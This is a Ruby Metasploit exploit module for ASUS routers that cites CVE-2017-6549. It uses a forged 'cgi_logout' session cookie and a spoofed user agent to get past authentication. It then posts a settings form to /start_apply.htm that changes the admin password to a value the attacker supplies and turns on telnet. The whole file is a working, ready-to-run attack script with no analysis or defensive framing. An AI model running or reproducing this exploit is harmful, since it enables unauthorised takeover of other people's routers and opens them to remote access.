require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super (update_info(info,
      'Name' => 'Session Stealing ASUS Router',
      'Description' => 'Checks for admin session and changes router password',
      'Author' => 'Taufiq Mohammed',
      'References' =>
        [
          ['CVE', '2017-6549']
        ],
      'Platform' => 'linux',
      'Targets' => 
        [
          ['System Version', 'ASUS-Router']
        ]))

    register_options(
      [
        OptAddress.new('RHOST', [true, 'IP Address', '0.0.0.0']),
        OptString.new('new_pw', [true, 'New Password', ''])
      ], self.class)

  end

  def change_password(telnet_enable='1')
    new_pw = datastore['new_pw']
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/start_apply.htm',
      'cookie' => 'asus_token=cgi_logout',
      'agent' => 'asusrouter-Windows-IFTTT-1.0',
      'vars_post' => {
	"productid" => "RT-N12D1",
	"current_page" => "Advanced_System_Content.asp",
	"next_page" => "Advanced_System_Content.asp",
	"modified" => "0",
	"flag" => "",
	"action_mode" => "apply",
	"action_wait" => "5",
	"action_script" => "restart_time%3Brestart_upnp",
	"first_time" => "",
	"preferred_lang" => "EN",
	"firmver" => "3.0.0.4",
	"time_zone_dst" => "0",
	"time_zone" => "GMT0",
	"time_zone_dstoff" => "M3.2.0%2F2%2CM10.2.0%2F2",
	"http_passwd" => new_pw,
	"http_clientlist" => "",
	"btn_ez_mode" => "0",
	"reboot_schedule_enable" => "0",
	"http_username" => "admin",
	"http_passwd2" => new_pw,
	"v_password2" => new_pw,
	"sshd_enable" => "0",
	"sshd_authkeys" => "",
	"btn_ez_radiotoggle" => "0",
	"reboot_schedule_enable_x" => "0",
	"reboot_time_x_hour" => "00",
	"reboot_time_x_min" => "00",
	"log_ipaddr" => "",
	"time_zone_select" => "GMT0",
	"dst_start_m" => "3",
	"dst_start_w" => "2",
	"dst_start_d" => "0",
	"dst_start_h" => "2",
	"dst_end_m" => "10",
	"dst_end_w" => "2",
	"dst_end_d" => "0",
	"dst_end_h" => "2",
	"ntp_server0" => "pool.ntp.org",
	"telnetd_enable" => "1",
	"http_enable" => "0",
	"https_lanport" => "8443",
	"misc_http_x" => "0",
	"http_autologout" => "30",
	"nat_redirect_enable" => "1",
	"http_client" => "0",
	"http_client_ip_x_0" => ""
      }
	})
    res_json  = res.get_json_document().to_s()
    if res && res.code == 200
      print_good("Successfully changed password to: " + new_pw)
      final_res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/Advanced_System_content.asp',
      'cookie' => 'asus_token=cgi_logout',
      'agent' => 'asusrouter-Windows-IFTTT-1.0',
      'vars_post' => {
        'flag' => '',
        'prev_page' => ''
      }
      })
    else
      print_bad("Couldn't change password to: " + new_pw)
      print_bad(res.code.to_s())
    end
  end

  def exploit
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => '/',
      'cookie' => 'asus_token=cgi_logout',
      'agent' => 'asusrouter-Windows-IFTTT-1.0'
    })
    if res && res.code == 200
      json_res = res.get_json_document()
      # If no error is found (Successful login)
      if json_res['error_status'] == nil
        print_good('Can access router!')
        change_password()
      else
        print_bad('Router can\'t be accessed!')
      end
    else
        print_bad("timeout :(")
    end
  end
end
